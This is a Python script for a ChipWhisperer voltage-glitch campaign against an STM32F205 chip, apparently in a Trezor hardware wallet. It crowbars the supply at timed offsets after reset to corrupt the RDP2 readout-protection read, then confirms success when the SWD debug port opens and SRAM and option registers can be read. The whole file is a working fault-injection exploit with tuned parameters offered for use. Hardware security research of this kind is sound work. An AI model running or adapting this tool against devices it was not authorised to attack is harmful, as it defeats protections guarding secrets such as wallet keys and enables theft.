#!/usr/bin/env python
"""Glitch-1: boot-time RDP corruption (RDP2 -> RDP1-behaviour) on the F205.

Same crowbar as the storage dump campaign (enable_only, glitch_hp+glitch_lp on
VCAP) but the glitch-1 knobs, proven on this hardware (backup/1-trezor_fun.py,
"SWD live in 6.5 s, first try at 17000"):
  - clkgen 100 MHz  (glitch-1's clock; the ext_offset window is defined at 100 MHz)
  - trigger = TIO4 = RESET rising edge (glitch fires ext_offset cycles after reset
    is released); glitch-2 triggers on the 0x11 UART burst - different line.
  - ext_offset 17000-18900  (= 170-189 us after reset at 100 MHz) - the BootROM
    option-byte load; corrupting the RDP read here makes the chip boot with
    RDP1 BEHAVIOUR (a corrupted RDP defaults to level 1; 0xAA=L0, 0xCC=L2).
  - offset -45, repeat 20 (width 40 is inert in enable_only, as on glitch-2).

SUCCESS = the SWD debug port ENUMERATES after the glitch. At RDP2 the DP is
fused off; a successful glitch-1 opens it (RDP1-behaviour) for that power cycle
only - transient, re-glitch every power cycle. On success we also read
DBGMCU_IDCODE + a SRAM word + OPTCR as confirmation (flash should still fault =
RDP1, not RDP0).

Boot pin: BOOT0 via TIO1 (G1_BOOT0, default LOW = boot the firmware normally,
per the plan "let it boot into firmware, glitch before it loads"). Set
G1_BOOT0=high to land the system bootloader instead.

Env knobs: G1_EXT_MIN/MAX/STEP, G1_SAMPLES, G1_OFFSET, G1_REPEAT, G1_WIDTH,
G1_BOOT0, G1_CLKGEN, G1_STOP_ON_SUCCESS, G1_COOLDOWN.
Run: /home/tdaly/.cwvenv/bin/python glitch1_boot_rdp.py
NOT destructive (resets + SWD reads only; no option-byte writes).
"""
import os
import sys
import csv
import gc
import time
from datetime import datetime

import chipwhisperer as cw

CLKGEN   = float(os.environ.get('G1_CLKGEN', 100e6))
EXT_MIN  = int(os.environ.get('G1_EXT_MIN', 17000))
EXT_MAX  = int(os.environ.get('G1_EXT_MAX', 18900))
EXT_STEP = int(os.environ.get('G1_STEP', 1))
SAMPLES  = int(os.environ.get('G1_SAMPLES', 8))
OFFSET   = int(os.environ.get('G1_OFFSET', -45))
REPEAT   = int(os.environ.get('G1_REPEAT', 20))
WIDTH    = int(os.environ.get('G1_WIDTH', 40))          # inert in enable_only
BOOT0_HI = os.environ.get('G1_BOOT0', 'low').lower() in ('high', '1', 'hi')
STOP_OK  = os.environ.get('G1_STOP_ON_SUCCESS', '1') == '1'
COOLDOWN = float(os.environ.get('G1_COOLDOWN', 0.1))
USB_RESET = '/home/tdaly/.cwvenv/usb_reset'

scope = None


def setup_scope():
    """Fresh CW open; clkgen FIRST (CLAUDE.md discipline), then glitch params."""
    s = cw.scope()
    s.clock.clkgen_freq = CLKGEN                 # FIRST - never reconfigure later
    s.adc.samples = 24400
    s.adc.offset = 0
    s.adc.basic_mode = 'rising_edge'
    s.adc.decimate = 10
    s.glitch.clk_src = 'clkgen'
    s.glitch.output = 'enable_only'              # crowbar (same as the dump campaign)
    s.glitch.trigger_src = 'ext_single'          # only after scope.arm()
    s.glitch.width = WIDTH
    s.glitch.offset = OFFSET
    s.glitch.repeat = REPEAT
    s.io.glitch_lp = True                        # crowbar FETs
    s.io.glitch_hp = True
    s.trigger.triggers = 'tio4'                  # RESET rising edge
    s.io.tio1 = True if BOOT0_HI else False      # BOOT0
    s.io.tio2 = 'high_z'
    s.io.target_pwr = 'high_z'
    return s


def reboot_flush():
    """Power-cycle with reset held, arm, release reset (the trigger edge),
    power on -> glitch fires ext_offset cycles after the reset release."""
    scope.io.target_pwr = False
    scope.io.nrst = False                        # assert reset
    time.sleep(0.05)
    scope.arm()
    scope.io.nrst = 'high_z'                      # release -> rising edge triggers
    scope.io.target_pwr = True


def swd_check():
    """Try to open SWD. Returns (ok, info). ok=True => debug port enumerated
    => glitch-1 bypassed RDP (RDP1-behaviour)."""
    try:
        os.system(f'{USB_RESET} >/dev/null 2>&1') if os.path.exists(USB_RESET) else None
        time.sleep(0.3)
        from swd.stlink import Stlink
        st = Stlink(swd_frequency=480000)
        idc = st.get_mem32(0xE0042000)
        sram = st.get_mem32(0x20000000)
        try:
            optcr = st.get_mem32(0x40023C14); rdp = (optcr >> 8) & 0xFF
        except Exception:
            optcr = rdp = -1
        try:
            st.get_mem32(0x08000000); flash = 'READ(RDP0?!)'
        except Exception:
            flash = 'fault(RDP1 ok)'
        info = (f'IDCODE=0x{idc:08X} SRAM0=0x{sram:08X} '
                f'OPTCR=0x{optcr:08X} RDP=0x{rdp:02X} flash={flash}')
        del st
        gc.collect()
        return True, info
    except Exception as e:
        return False, f'{type(e).__name__}'


def teardown():
    global scope
    try:
        if scope:
            scope.io.glitch_lp = False
            scope.io.glitch_hp = False
            scope.io.target_pwr = 'high_z'
            scope.dis()
    except Exception:
        pass


def main():
    global scope
    print('=' * 64)
    print(f'glitch-1 boot glitch  clkgen={CLKGEN/1e6:g}MHz  trigger=tio4(reset)')
    print(f'ext {EXT_MIN}-{EXT_MAX} step {EXT_STEP}  offset={OFFSET} repeat={REPEAT} '
          f'(width {WIDTH} inert)  BOOT0={"HIGH(bootloader)" if BOOT0_HI else "low(firmware)"}')
    print(f'success = SWD enumerates (RDP2->RDP1-behaviour).  samples/pt={SAMPLES}')
    print('=' * 64)
    scope = setup_scope()
    print(f'[+] CROWBAR ARMED enable_only @ {CLKGEN/1e6:g}MHz, hp+lp, '
          f'rep{REPEAT} = {REPEAT/CLKGEN*1e9:.0f}ns pulse')

    logp = os.path.join('campaigns',
                        f'glitch1_{datetime.now():%Y%m%d_%H%M%S}.csv')
    os.makedirs('campaigns', exist_ok=True)
    lw = csv.writer(open(logp, 'w', newline=''))
    lw.writerow(['shot', 'ext_offset', 'us_after_reset', 'result', 'info'])

    shot = 0
    successes = 0
    try:
        for ext in range(EXT_MIN, EXT_MAX + 1, EXT_STEP):
            scope.glitch.ext_offset = ext
            us = ext / CLKGEN * 1e6
            for _ in range(SAMPLES):
                shot += 1
                reboot_flush()
                time.sleep(0.15)                  # let boot + glitch happen
                ok, info = swd_check()
                res = 'SUCCESS' if ok else 'nolink'
                lw.writerow([shot, ext, round(us, 1), res, info])
                print(f'  [{datetime.now():%H:%M:%S}] #{shot} ext={ext} '
                      f'({us:.1f}us) -> {res}' + (f'  {info}' if ok else ''))
                if ok:
                    successes += 1
                    print(f'\n[***] GLITCH-1 SUCCESS at ext={ext} ({us:.1f}us): {info}\n')
                    try:
                        os.system("spd-say -r -10 'glitch one success' 2>/dev/null &")
                    except Exception:
                        pass
                    if STOP_OK:
                        print('[+] STOP_ON_SUCCESS - debug port open, holding '
                              'this power state (do NOT power-cycle).')
                        return
                time.sleep(COOLDOWN)
    finally:
        print(f'[=] done: {shot} shots, {successes} successes -> {logp}')
        teardown()


if __name__ == '__main__':
    main()
